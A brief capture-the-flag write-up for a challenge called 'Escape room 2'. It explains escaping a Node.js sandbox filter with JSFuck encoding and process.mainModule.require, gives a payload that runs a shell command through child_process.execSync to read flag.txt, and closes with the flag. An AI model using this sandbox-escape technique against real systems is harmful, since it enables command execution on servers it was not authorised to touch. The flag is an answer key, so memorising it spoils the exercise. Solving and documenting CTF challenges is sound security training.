# Escape room 2

## Write-up

To bypass the filter, we can use [JSFuck](https://jsfuck.com/) which encodes Javascript/NodeJS into a mix of `!+[]()`.
To keep `require` defined, we have to use `process.mainModule.require` instead.

The payload is:

```javascript
console.log(
  process.mainModule
    .require("child_process")
    .execSync("cat flag.txt")
    .toString()
);
```

## Flag

`flag-1e4011697d0ea15fc6a3cf37baaf2d5f`
